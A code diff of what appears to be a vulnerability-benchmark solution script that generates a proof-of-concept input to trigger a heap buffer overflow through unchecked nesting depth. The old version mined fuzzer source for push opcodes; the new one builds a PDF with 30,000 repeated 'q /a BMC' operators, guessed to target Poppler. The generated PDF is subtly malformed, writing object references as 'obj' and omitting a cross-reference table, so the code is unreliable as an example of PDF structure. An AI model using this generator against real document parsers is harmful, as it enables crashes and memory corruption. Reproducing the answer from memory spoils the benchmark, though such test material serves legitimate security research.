@@ -1,127 +1,47 @@
-import os
-import re
-import random
-import tarfile
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
         
-        Strategy:
-        1. Scan the provided source code (directory or tarball) for fuzzer implementations.
-        2. Identify the fuzzer that handles graphics commands (looking for 'save', 'clip', 'restore').
-        3. Parse the switch-case statements to map opcode values to these commands.
-        4. Generate a payload that repeatedly sends 'save' or 'clip' commands (push operations) 
-           while avoiding 'restore' (pop operations) to trigger the heap buffer overflow 
-           via unchecked nesting depth.
-        5. Use a fallback range of byte values if opcode extraction fails.
+        The vulnerability describes unchecked nesting depth before pushing a clip mark,
+        likely within the Poppler PDF library's Gfx::opBeginMarkedContent or similar state 
+        management functions. To trigger this, we construct a PDF with a content stream 
+        that performs deep nesting of Marked Content (BMC) and Graphics State (q) operators 
+        without corresponding closing operators (EMC/Q).
         """
         
-        opcodes = {'save': [], 'clip': [], 'restore': []}
-        found_good_fuzzer = False
+        # Repetition count:
+        # Ground truth PoC is ~825KB. We aim for a sufficiently large nesting depth
+        # to trigger a heap buffer overflow (exceeding fixed heap-allocated stack sizes)
+        # while keeping the file smaller than the ground truth for a better score.
+        # 30,000 iterations of "q /a BMC\n" produces ~270KB payload + headers.
+        iterations = 30000
         
-        # Generator to handle both directory and tarball traversal
-        def get_content_iter(path):
-            if os.path.isdir(path):
-                for root, _, files in os.walk(path):
-                    for file in files:
-                        if file.endswith((".cc", ".cpp", ".c")) and ("fuzz" in file or "test" in file):
-                            yield os.path.join(root, file), None
-            elif tarfile.is_tarfile(path):
-                try:
-                    with tarfile.open(path, 'r') as tar:
-                        for member in tar.getmembers():
-                            if member.isfile() and member.name.endswith((".cc", ".cpp", ".c")) and ("fuzz" in member.name or "test" in member.name):
-                                yield member.name, tar.extractfile(member)
-                except Exception:
-                    pass
-
-        # Scan for the relevant fuzzer
-        for name, handle in get_content_iter(src_path):
-            try:
-                content = ""
-                if handle:
-                    content = handle.read().decode('utf-8', errors='ignore')
-                else:
-                    with open(name, 'r', encoding='utf-8', errors='ignore') as f:
-                        content = f.read()
-                
-                # We are looking for the fuzz target function
-                if "LLVMFuzzerTestOneInput" not in content:
-                    continue
-                
-                local_opcodes = {'save': [], 'clip': [], 'restore': []}
-                
-                # Heuristic parsing of switch-case structure
-                # Split by 'case' keyword, capturing the value part
-                parts = re.split(r'case\s+([^:]+):', content)
-                
-                # Iterate through pairs of (value, body)
-                for i in range(1, len(parts), 2):
-                    val_str = parts[i].strip()
-                    # The body extends until the next case (or end of split), so it's safe to search
-                    body = parts[i+1].lower()
-                    
-                    val = None
-                    # Parse literal integers, hex, or char constants
-                    if val_str.isdigit():
-                        val = int(val_str)
-                    elif val_str.startswith("0x"):
-                        try: val = int(val_str, 16)
-                        except: pass
-                    elif val_str.startswith("'") and val_str.endswith("'") and len(val_str) == 3:
-                        val = ord(val_str[1])
-                    
-                    if val is not None:
-                        # Identify commands based on keywords in the case block
-                        if "restore" in body:
-                            local_opcodes['restore'].append(val)
-                        elif "save" in body:
-                            local_opcodes['save'].append(val)
-                        elif "clip" in body:
-                            local_opcodes['clip'].append(val)
-                
-                # If we found graphics-related opcodes, this is likely the correct fuzzer
-                if local_opcodes['save'] or local_opcodes['clip']:
-                    opcodes = local_opcodes
-                    found_good_fuzzer = True
-                    break 
-                    
-            except Exception:
-                continue
-
-        # Prepare the list of opcodes to use
-        # We want to push to the stack (save/clip) and avoid popping (restore)
-        push_ops = opcodes['save'] + opcodes['clip']
-        pop_ops = set(opcodes['restore'])
+        # PDF Header
+        pdf = bytearray(b"%PDF-1.4\n")
         
-        if not push_ops:
-            # Fallback: if extraction failed, assume small integer opcodes (common in fuzzers)
-            # Avoiding 0 as it often maps to 'Exit' or 'Done'
-            final_ops = list(range(1, 32))
-        else:
-            # Use found push ops, excluding any that act as restores
-            final_ops = [op for op in push_ops if op not in pop_ops]
-            # If filtration removes everything (unlikely), revert to push_ops
-            if not final_ops: 
-                final_ops = push_ops
-
-        # Generate Payload
-        payload = bytearray()
+        # Object 1: Catalog
+        pdf.extend(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 obj >>\nendobj\n")
         
-        # Ground truth is ~800KB. We generate ~200KB to ensure we hit the overflow limit 
-        # while keeping the file smaller for a better score.
-        target_len = 200000 
+        # Object 2: Pages
+        pdf.extend(b"2 0 obj\n<< /Type /Pages /Kids [3 0 obj] /Count 1 >>\nendobj\n")
         
-        while len(payload) < target_len:
-            # Pick a push operation
-            op = random.choice(final_ops)
-            payload.append(op)
-            
-            # Append random arguments. 
-            # Variable length padding (0-16 bytes) handles different argument consumption rates
-            # and ensures we desynchronize/resynchronize with the command loop effectively.
-            payload.extend(os.urandom(random.randint(0, 16)))
-            
-        return bytes(payload)
+        # Object 3: Page
+        pdf.extend(b"3 0 obj\n<< /Type /Page /Parent 2 0 obj /MediaBox [0 0 612 792] /Contents 4 0 obj >>\nendobj\n")
+        
+        # Object 4: Content Stream
+        # We interleave "q" (save graphics state, pushing to state stack) 
+        # and "/a BMC" (begin marked content, pushing to marked content stack).
+        # This maximizes the chance of hitting the vulnerable stack (clip stack or marked content stack).
+        stream_payload = b"q /a BMC\n" * iterations
+        
+        pdf.extend(b"4 0 obj\n<< /Length " + str(len(stream_payload)).encode() + b" >>\nstream\n")
+        pdf.extend(stream_payload)
+        pdf.extend(b"\nendstream\nendobj\n")
+        
+        # Trailer
+        pdf.extend(b"trailer\n<< /Root 1 0 obj >>\n%%EOF\n")
+        
+        return bytes(pdf)
